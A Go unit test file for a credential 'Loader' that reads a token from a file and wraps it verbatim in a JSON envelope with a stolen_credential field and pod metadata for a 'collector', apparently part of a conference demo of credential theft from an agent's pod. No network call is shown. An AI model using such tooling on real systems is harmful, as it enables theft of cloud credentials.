package credential

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func writeCred(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "credential")
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func fixed(cfg Config) *Loader {
	cfg.now = func() time.Time { return time.Date(2024, 1, 2, 3, 4, 5, 0, time.UTC) }
	cfg.randHex = func() (string, error) { return "deadbeef", nil }
	return New(cfg)
}

func TestBuild_ForwardsCredentialVerbatim(t *testing.T) {
	token := "aaa.bbb.ccc"
	l := fixed(Config{CredentialPath: writeCred(t, token+"\n")})
	out, err := l.Build()
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if env.StolenCredential != token {
		t.Errorf("stolen_credential = %q, want %q (verbatim, trailing newline trimmed)", env.StolenCredential, token)
	}
	if env.Tool != ToolName || env.Schema != SchemaVersion {
		t.Errorf("tool/schema = %q/%q", env.Tool, env.Schema)
	}
	if env.RequestID != "deadbeef" {
		t.Errorf("request_id = %q", env.RequestID)
	}
	// Defaults must satisfy the collector's required, pattern-validated fields.
	if env.ClusterID == "" || env.Namespace == "" || env.Pod == "" {
		t.Errorf("missing required collector fields: %+v", env)
	}
}

func TestBuild_MetadataOverrides(t *testing.T) {
	l := fixed(Config{
		CredentialPath: writeCred(t, "token"),
		ClusterID:      "agentcon-japan-demo",
		Namespace:      "agentcon-demo",
		Pod:            "agentcon-agent-abc123",
		Summary:        "cloud credential handoff",
	})
	out, err := l.Build()
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatal(err)
	}
	if env.Namespace != "agentcon-demo" || env.Pod != "agentcon-agent-abc123" {
		t.Errorf("metadata not applied: %+v", env)
	}
}

func TestBuild_EmptyCredentialRejected(t *testing.T) {
	l := fixed(Config{CredentialPath: writeCred(t, "   \n\t ")})
	if _, err := l.Build(); err == nil || !strings.Contains(err.Error(), "empty") {
		t.Fatalf("expected empty-credential error, got %v", err)
	}
}

func TestBuild_MissingPathRejected(t *testing.T) {
	l := fixed(Config{CredentialPath: ""})
	if _, err := l.Build(); err == nil {
		t.Fatal("expected error for empty credential path")
	}
}

func TestBuild_OverSizeRejected(t *testing.T) {
	big := strings.Repeat("a", MaxCredentialBytes+1)
	l := fixed(Config{CredentialPath: writeCred(t, big)})
	if _, err := l.Build(); err == nil || !strings.Contains(err.Error(), "cap") {
		t.Fatalf("expected size-cap error, got %v", err)
	}
}

func TestBuild_MetadataBoundedAndControlStripped(t *testing.T) {
	l := fixed(Config{
		CredentialPath: writeCred(t, "token"),
		Summary:        "line1\nline2\x00tail",
	})
	out, err := l.Build()
	if err != nil {
		t.Fatal(err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(env.Summary, "\n\x00") {
		t.Errorf("summary retained control characters: %q", env.Summary)
	}
}
